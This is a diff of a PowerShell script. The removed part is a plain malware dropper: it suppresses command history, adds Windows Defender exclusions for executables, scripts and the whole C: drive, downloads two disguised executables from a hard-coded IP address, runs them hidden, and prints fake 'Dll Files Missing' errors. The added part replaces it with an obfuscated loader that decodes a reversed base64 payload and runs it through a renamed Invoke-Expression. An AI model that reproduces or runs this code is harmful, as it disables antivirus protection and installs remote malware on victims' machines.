@@ -1,36 +1,11 @@
-Set-PSReadLineOption -HistorySaveStyle SaveNothing
-
-$path1 = "$env:windir\System32\svhost.exe"
-$path2 = "$env:windir\System32\msupdate.exe"
-
-try {
-    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction Stop
-    Add-MpPreference -ExclusionExtension ".src" -ErrorAction Stop
-    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction Stop
-    Add-MpPreference -ExclusionExtension ".lnk" -ErrorAction Stop
-    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
-} catch {
-    Write-Output "Dll Files Missing"
-    exit
-}
-
-try {
-    Invoke-WebRequest -Uri "http://93.127.133.251:6767/svhost.exe" -OutFile $path1 -ErrorAction Stop
-    Start-Process -FilePath $path1 -WindowStyle Hidden -ErrorAction Stop
-} catch {
-    Write-Output "Failed to download or run msutil.exe"
-    Remove-Item $path1 -Force -ErrorAction SilentlyContinue
-    exit
-}
-
-try {
-    Invoke-WebRequest -Uri "http://93.127.133.251:6767/msupdate.exe" -OutFile $path2 -ErrorAction Stop
-    Start-Process -FilePath $path2 -WindowStyle Hidden -ErrorAction Stop
-} catch {
-    Write-Output "Dll Files Missing"
-    Remove-Item $path2 -Force -ErrorAction SilentlyContinue
-    exit
-}
-
-Remove-Item $path1 -Force -ErrorAction SilentlyContinue
-Remove-Item $path2 -Force -ErrorAction SilentlyContinue
+$best64code = "UWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgU2Yy9mRtAiMoRXYwRCItVGdJ1SZ29WblJlCNUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgU2Yy9mRtASMoRXYwRCItVGdJ1SZ29WblJlCNoQD9pQD0lGelBCIgAiCNUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgU2Yy9mRtAiMoRXYwRCItVGdJ1SZ29WblJFIgACIK0gIn5WazNXaNByclxWaGBCbsRkIgQXdwRXdP1SZ0lmcXBCIgAiCNsHIoNGdhNGI9pQDw9GdTBibvlGdjFkcvJncF1CIuVGZklGSgUGb5R3U39GZul2VtAiMoRXYwRCIoRXYQVGbpZULgM3clN2byBVL0JXY0NFIgACIK0AcvR3Ug42bpR3YBJ3byJXRtAiMoRXYwRCIlxWaGRXdP1CIiUGel5SZ0FGZwV3ct9yN2cjN6ETNy4yMzEjL3ITMuMTOv8iOwRHdoJCIpJXVtACdzVWdxVmUiV2VtU2avZnbJBCIgAiCNsHI5JHdK0gCN0nCNQXa4VGIgACIK0QZ15Wa052bDlHb05WZsl2Ug42bpR3YBJ3byJXRtASZjJ3bG1CIxgGdhBHJg0WZ0lULlZ3btVmUgACIgoQDiUGel5CbpRXdz1GIuVncgI3bgQWYvxmb39GZg8GdgQWZslWYGJCI0VHc0V3TtUGdpJ3VgACIgoQD7BCajRXYjBSfK0AcvR3Ug42bpR3YBJ3byJXRtAiblRGZphEIlxWe0N1dvRmbpdVLgEDa0FGckACa0FGUlxWaG1CIzNXZj9mcQ1CdyFGdTBCIgAiCNA3b0NFIu9Wa0NWQy9mcyVULgEDa0FGckASZslmR0V3TtAiIlhXZuQ3cvhmdz9yN2cjN6ETNy4yMzEjL3ITMuMTOv8iOwRHdoJCIpJXVtACdzVWdxVmUiV2VtU2avZnbJBCIgAiCNsHI5JHdK0gCN0nCNQXa4VGIgACIK0gIn5WazNXaNByclxWaGBCbsRkIgQXdwRXdP1SZ0lmcXBCIgAiCNsHIoNGdhNGI9pQDw9GdTBibvlGdjFkcvJncF1CIiwlODJCIoRXYQ52bpNXdsNGeF1CIlNmblJXZmVmcQBXTtQGZBBCIgAiCNA3b0NFIu9Wa0NWQy9mcyVULgIyauxmLiAibvl2cuVGd4Vkbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIgACIK0AcvR3Ug42bpR3YBJ3byJXRtAiIxMHcuICIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgACIgoQDw9GdTBibvlGdjFkcvJncF1CIiMmcz5iIg42bpNnblRHeF52bpNXdsNGeF1CIlNmblJXZmVmcQBXTtQGZBBCIgAiCNA3b0NFIu9Wa0NWQy9mcyVULgISZ4VmLiAibvl2cuVGd4Vkbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIgACIK0wegknc0pQDK0gIlhXZuUGdhRGc1NXbcJzMtVGdzl3UcJXak5Wa3pjduVGJiASPgIDa0FGckoQDiUGel5Cdz9Ga2NHXyMTblR3c5NFXylGZul2d6YnblRiIg0DIxgGdhBHJK0gCNcmbphGdv5UZ2F2UgUGb5R3UlZXYTlncvR3cphULg42bpRHcPVmbpxEZhVmUTBVL0V2U" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
+$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
+$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
+$RandomSTR64 = '40bpN1clJFcYVULFt2b25WS'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
+$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
+$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
+$aliasSTR64 = 'QWOZzV'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
+$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
+$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
+$NuLl = NeW-AlIAs -Name $AlIASfINAl -vaLUe $IexcMd -ForCE ; & $aLiASfinAl $lOADcOdE ;
